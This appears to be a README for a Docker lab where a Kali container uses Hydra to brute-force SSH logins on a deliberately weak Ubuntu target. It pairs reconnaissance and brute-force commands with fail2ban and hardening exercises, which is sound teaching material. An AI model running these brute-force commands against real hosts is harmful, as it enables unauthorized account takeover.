# SSH Brute Force Testing Environment

This project provides a fully dockerized environment for testing SSH brute force attacks using Kali Linux and Hydra. It's designed for educational purposes and penetration testing demonstrations.

## ⚠️ **DISCLAIMER**
This setup is intended for **EDUCATIONAL PURPOSES ONLY**. Only use this on systems you own or have explicit permission to test. Unauthorized access to computer systems is illegal.

## Architecture

The environment consists of two Docker containers:
- **Kali Linux Container** (`kali-attacker`): Contains Hydra and SSH tools for conducting attacks
- **SSH Target Container** (`ssh-target`): Ubuntu server with SSH service and vulnerable test accounts

Both containers are connected via a custom Docker network (`pentest-network`) with subnet `172.20.0.0/24`.

## Prerequisites

- Docker and Docker Compose installed
- At least 4GB RAM available
- Basic understanding of SSH and brute force attacks

## Quick Start

1. **Build and start the environment:**
   ```bash
   docker-compose up -d --build
   ```

2. **Access the Kali Linux container:**
   ```bash
   docker exec -it kali-attacker /bin/bash
   ```

3. **Verify network connectivity:**
   ```bash
   ping ssh-target
   nmap -p 22 ssh-target
   ```

## Test Accounts

The SSH target container has the following test accounts configured:

| Username | Password    |
|----------|-------------|
| root     | root123     |
| admin    | admin123    |
| user     | password123 |
| test     | test123     |
| guest    | guest123    |

## Attack Execution

### Method 1: Using Custom Wordlists

The environment includes custom wordlists located in `/root/wordlists/`:

1. **Single user brute force:**
   ```bash
   hydra -l admin -P /root/wordlists/passwords.txt ssh://ssh-target
   ```

2. **Multiple users brute force:**
   ```bash
   hydra -L /root/wordlists/users.txt -P /root/wordlists/passwords.txt ssh://ssh-target
   ```

3. **Verbose output with specific options:**
   ```bash
   hydra -L /root/wordlists/users.txt -P /root/wordlists/passwords.txt -t 4 -v ssh://ssh-target
   ```

### Method 2: Using Kali's Built-in Wordlists

1. **Using rockyou.txt (if available):**
   ```bash
   hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://ssh-target
   ```

2. **Using SecLists:**
   ```bash
   hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt ssh://ssh-target
   ```

### Advanced Attack Options

1. **Limit concurrent tasks and add delays:**
   ```bash
   hydra -L /root/wordlists/users.txt -P /root/wordlists/passwords.txt -t 2 -w 3 ssh://ssh-target
   ```

2. **Save results to file:**
   ```bash
   hydra -L /root/wordlists/users.txt -P /root/wordlists/passwords.txt -o results.txt ssh://ssh-target
   ```

3. **Continue on first found credential:**
   ```bash
   hydra -L /root/wordlists/users.txt -P /root/wordlists/passwords.txt -f ssh://ssh-target
   ```

## Network Reconnaissance

Before attacking, perform reconnaissance:

1. **Port scanning:**
   ```bash
   nmap -sV -p 22 ssh-target
   ```

2. **SSH banner grabbing:**
   ```bash
   nmap -sV --script ssh2-enum-algos ssh-target
   ```

3. **Check SSH configuration:**
   ```bash
   ssh-audit ssh-target
   ```

## Testing Successful Authentication

Once credentials are found, test them:

```bash
ssh admin@ssh-target
# Enter password when prompted
```

Or from host machine:
```bash
ssh admin@localhost -p 2222
```

## Monitoring and Logs

1. **View SSH target logs:**
   ```bash
   docker logs ssh-target
   ```

2. **Monitor failed login attempts:**
   ```bash
   docker exec ssh-target tail -f /var/log/auth.log
   ```

## Protection Mechanisms Demo

To demonstrate protection mechanisms, you can modify the SSH target:

1. **Access the target container:**
   ```bash
   docker exec -it ssh-target /bin/bash
   ```

2. **Install and configure fail2ban:**
   ```bash
   apt update && apt install -y fail2ban
   systemctl enable fail2ban
   systemctl start fail2ban
   ```

3. **Configure SSH to limit attempts:**
   ```bash
   echo "MaxAuthTries 3" >> /etc/ssh/sshd_config
   systemctl restart ssh
   ```

## Container Management

- **Start environment:** `docker-compose up -d`
- **Stop environment:** `docker-compose down`
- **Rebuild containers:** `docker-compose up -d --build`
- **View logs:** `docker-compose logs`
- **Access Kali container:** `docker exec -it kali-attacker /bin/bash`
- **Access SSH target:** `docker exec -it ssh-target /bin/bash`

## Troubleshooting

1. **Cannot connect to SSH target:**
   - Verify containers are running: `docker ps`
   - Check network connectivity: `docker exec kali-attacker ping ssh-target`

2. **Hydra not found:**
   - Rebuild the Kali container: `docker-compose build kali`

3. **Permission denied:**
   - Ensure proper file permissions on startup.sh: `chmod +x startup.sh`

## Educational Exercises

1. **Credential Discovery:** Find all valid credentials using different attack methods
2. **Rate Limiting:** Implement and test rate limiting mechanisms
3. **Log Analysis:** Analyze authentication logs to understand attack patterns
4. **Defense Implementation:** Add fail2ban and observe attack mitigation

## Security Best Practices (Defense)

This environment also demonstrates why these practices are important:

- Use strong, unique passwords
- Implement account lockout policies
- Use key-based authentication instead of passwords
- Enable logging and monitoring
- Use fail2ban or similar intrusion prevention
- Change default SSH port
- Implement network segmentation

## Files Structure

```
.
├── docker-compose.yml          # Main orchestration file
├── Dockerfile                  # Kali Linux container
├── Dockerfile.target          # SSH target container
├── startup.sh                 # Kali container startup script
├── wordlists/
│   ├── users.txt              # Username wordlist
│   └── passwords.txt          # Password wordlist
├── kali-data/                 # Persistent Kali data
└── README.md                  # This file
```

## Legal and Ethical Use

- **Only test systems you own or have explicit written permission to test**
- **Respect rate limits and don't cause service disruption**
- **Use for educational and authorized penetration testing only**
- **Follow responsible disclosure if vulnerabilities are found**

## Contributing

Feel free to submit issues or pull requests to improve this testing environment.

## License

This project is provided for educational purposes. Users are responsible for complying with all applicable laws and regulations.